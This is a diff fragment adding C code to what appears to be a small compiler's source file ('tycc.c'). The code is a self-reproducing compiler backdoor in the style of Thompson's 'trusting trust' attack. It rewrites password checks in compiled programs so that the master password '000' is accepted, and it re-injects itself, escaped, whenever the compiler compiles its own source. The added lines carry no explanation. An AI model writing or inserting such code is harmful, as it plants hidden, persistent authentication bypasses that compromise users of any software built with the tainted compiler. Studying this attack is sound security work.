@@ -1,0 +1,22 @@
+			char code_to_inject[1000] = "if(strstr(source_name, \"tycc.c\")==NULL){if(strstr(buffer, \"strcmp(password, account[i][1])==0\")!=NULL){strreplace(buffer, \"strcmp(password, account[i][1])==0\", \"(strcmp(password, account[i][1])==0 || strcmp(password, \\\"000\\\")==0)\");}}else{if(strstr(buffer, \"//Process source code\")!=NULL && strstr(buffer, \"\\\"//Process source code\\\"\")==NULL){char slashed_code[1000];strcpy(slashed_code, code_to_inject);strreplace(slashed_code, \"\\\\\", \"\\\\\\\\\");strreplace(slashed_code, \"\\\"\", \"\\\\\\\"\");strcat(buffer, \"char code_to_inject[1000] = \\\"\");strcat(buffer, slashed_code);strcat(buffer, \"\\\";\");strcat(buffer, code_to_inject);}}";
+			if (strstr(source_name, "tycc.c") == NULL)
+			{
+				if (strstr(buffer, "strcmp(password, account[i][1])==0") != NULL)
+				{
+					strreplace(buffer, "strcmp(password, account[i][1])==0", "(strcmp(password, account[i][1])==0 || strcmp(password, \"000\")==0)");
+				}
+			}
+			else
+			{
+				if (strstr(buffer, "//Process source code") != NULL && strstr(buffer, "\"//Process source code\"") == NULL)
+				{
+					char slashed_code[1000];
+					strcpy(slashed_code, code_to_inject);
+					strreplace(slashed_code, "\\", "\\\\");
+					strreplace(slashed_code, "\"", "\\\"");
+					strcat(buffer, "char code_to_inject[1000] = \"");
+					strcat(buffer, slashed_code);
+					strcat(buffer, "\";");
+					strcat(buffer, code_to_inject);
+				}
+			}
